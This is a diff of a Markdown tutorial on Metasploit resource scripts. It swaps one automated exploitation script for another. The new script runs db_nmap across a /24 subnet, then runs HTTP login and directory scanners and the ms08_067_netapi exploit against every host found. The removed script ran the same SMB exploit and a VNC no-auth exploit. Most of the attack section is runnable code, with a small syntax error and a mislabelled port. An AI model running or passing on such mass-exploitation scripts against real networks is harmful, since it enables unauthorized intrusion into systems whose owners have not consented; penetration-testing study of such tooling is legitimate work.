@@ -62,7 +62,7 @@
       msf > version
       msf > makerc /root/script.rc
 
-    `[run]` msf > resource /root/script.rc
+    `[run] msf >` resource /root/script.rc
 
 <br /><br />
 
@@ -264,39 +264,50 @@
 
 <br /><br />
 
-- **FFF::**`[exploiter.rc]`<br />
+<blockquote>Run auxiliay/exploit modules based on database (targets) ports found</blockquote>
+
+- **Run auxiliay/exploit modules based on database (targets) ports found::**`[exploiter.rc]`<br />
 
 <br />
 
       touch exploiter.rc
 
-        echo 'setg RHOSTS 192.168.1.71 192.168.1.254' > exploiter.rc
-        echo '<ruby>' >> exploiter.rc
-        echo 'framework.db.hosts.each do |h|' >> exploiter.rc
-        echo '   h.services.each do |serv|' >> exploiter.rc
-        echo '' >> exploiter.rc
-        echo '   if serv.port == 445 and h.os_flavor =~/XP|.NET Server|2003/i' >> exploiter.rc
-        echo '          next if (serv.port != 445)' >> exploiter.rc
-        echo '          print_good("#{h.address} seems to be Windows #{h.os_flavor}.")' >> exploiter.rc
-        echo '          run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
-        echo '          print_good("Running ms08_067_netapi check against #{h.address}")' >> exploiter.rc
-        echo '          run_single("set RHOST #{h.address}")' >> exploiter.rc
-        echo '          run_single("check")' >> exploiter.rc
-        echo '   elsif serv.port == 5900 and h.os_name =~/Linux/i' >> exploiter.rc
-        echo '          next if (serv.port != 5900)' >> exploiter.rc
-        echo '          print_good("#{h.address} seems to be Linux #{h.os_flavor}.")' >> exploiter.rc
-        echo '          run_single("use auxiliary/scanner/vnc/vnc_none_auth")' >> exploiter.rc
-        echo '          print_good("Running VNC no auth check against #{h.os_flavor}")' >> exploiter.rc
-        echo '          run_single("set RHOSTS #{h.address}")' >> exploiter.rc
-        echo '          run_single("exploit")' >> exploiter.rc
-        echo '   else' >> exploiter.rc
-        echo '          print_error("#{h.address} does not have port 445/5900 open")' >> exploiter.rc
-        echo '          return nil' >> exploiter.rc
-        echo '   end' >> exploiter.rc
-        echo ' end' >> exploiter.rc
-        echo 'end' >> exploiter.rc
-        echo '</ruby>' >> exploiter.rc
-        echo 'unsetg RHOSTS' >> exploiter.rc
+      db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24
+      services
+ 
+         <ruby>
+            xhost = framework.db.hosts.map(&:address).join(' ')
+            xport = framework.db.services.map(&:port).join(' ')
+            run_single("setg RHOSTS #{xhost}")
+               if xport =~ /80/i
+                    print_status("## Target port: 80 http found")
+                    print_good("## Running port 80 auxiliary/exploits.")
+                    run_single("use auxiliary/scanner/http/title")
+                    run_single("exploit")
+                    print_good("######### dir_scanner auxiliary #########")
+                    run_single("use auxiliary/scanner/http/dir_scanner")
+                    run_single("exploit")
+                    print_good("######### http_login auxiliary #########"
+                    run_single("use auxiliary/scanner/http/http_login")
+                    run_single("exploit")
+               end
+
+               if xport =~ /445/i
+                    print_status("## Target port: 445 https found")
+                    print_good("## Running port 445 auxiliary/exploits.")
+                    run_single("use exploit/windows/smb/ms08_067_netapi")
+                    run_single("exploit")
+               end
+
+               if xport =~ /139/i
+                    print_status("## Target port: 139 smb found")
+                    print_good("## Running port 139 auxiliary/exploits.")
+                    run_single("use exploit/windows/smb/ms08_067_netapi")
+                    run_single("exploit")
+               end
+         </ruby>
+
+      unsetg RHOSTS
 
      `[run]` msfconsole -r /root/exploiter.rc
 
